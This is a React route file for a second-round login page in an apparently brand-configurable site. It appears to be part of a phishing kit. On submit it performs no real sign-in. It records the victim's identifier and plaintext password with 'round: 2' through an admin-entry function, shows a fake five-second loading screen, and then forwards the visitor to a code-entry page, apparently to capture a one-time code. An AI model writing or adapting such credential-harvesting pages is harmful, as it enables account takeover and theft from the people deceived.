import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { NeroCard, NeroShell, NeroWordmark } from "@/components/nero/Shell";
import { PrimaryButton } from "@/components/nero/PrimaryButton";
import { LoadingOverlay } from "@/components/nero/LoadingOverlay";
import { recordAdminEntry } from "@/lib/nero-flow";
import { getSiteData } from "@/lib/cms.functions";

export const Route = createFileRoute("/login-2")({
  loader: () => getSiteData(),
  head: ({ loaderData }) => {
    const c = loaderData?.content.login2;
    const meta: Array<Record<string, string>> = [];
    if (c?.seoTitle) meta.push({ title: c.seoTitle }, { property: "og:title", content: c.seoTitle });
    if (c?.seoDescription)
      meta.push(
        { name: "description", content: c.seoDescription },
        { property: "og:description", content: c.seoDescription },
      );
    return { meta };
  },
  component: LoginTwoPage,
});

function LoginTwoPage() {
  const { brand, content, extras } = Route.useLoaderData();
  const c = content.login2;
  const e = extras.login2;
  const navigate = useNavigate();
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  const valid = identifier.trim().length > 3 && password.length >= 6;

  return (
    <NeroShell brand={brand} customCss={e.customCss} blocks={e.blocks}>
      {loading && <LoadingOverlay label={c.loadingLabel} />}
      <div className="pt-6 pb-8">
        <NeroWordmark text={brand.wordmark} />
        <p className="mt-3 text-center text-[14px] text-muted-foreground">{c.headingRound2}</p>
      </div>

      <NeroCard>
        <form
          className="nero-login-form space-y-3"
          onSubmit={(e) => {
            e.preventDefault();
            if (!valid) {
              setError(c.validationError);
              return;
            }
            setError(null);
            setLoading(true);
            recordAdminEntry({ kind: "login", identifier, password, round: 2 });
            window.setTimeout(() => navigate({ to: "/code-1b" }), 5000);
          }}
        >
          <input
            aria-label="Email address or phone number"
            placeholder={c.identifierPlaceholder}
            autoComplete="username"
            value={identifier}
            onChange={(e) => setIdentifier(e.target.value)}
            className="nero-login-input h-12 w-full rounded-md border border-input bg-card px-4 text-[16px] text-card-foreground placeholder:text-muted-foreground focus:border-ring focus:ring-2 focus:ring-ring/30 focus:outline-none"
          />
          <input
            aria-label="Password"
            type="password"
            placeholder={c.passwordPlaceholder}
            autoComplete="current-password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="nero-login-input nero-login-password h-12 w-full rounded-md border border-input bg-card px-4 text-[16px] text-card-foreground placeholder:text-muted-foreground focus:border-ring focus:ring-2 focus:ring-ring/30 focus:outline-none"
          />
          {error && <p className="nero-login-error text-[13px] text-destructive">{error}</p>}
          <PrimaryButton type="submit">{c.submitLabel}</PrimaryButton>
        </form>


        <p className="mt-4 text-center text-[14px] font-medium text-brand-link">{c.forgotLabel}</p>
      </NeroCard>

      <p className="mt-6 text-center text-[13px] text-muted-foreground">{c.footer}</p>
    </NeroShell>
  );
}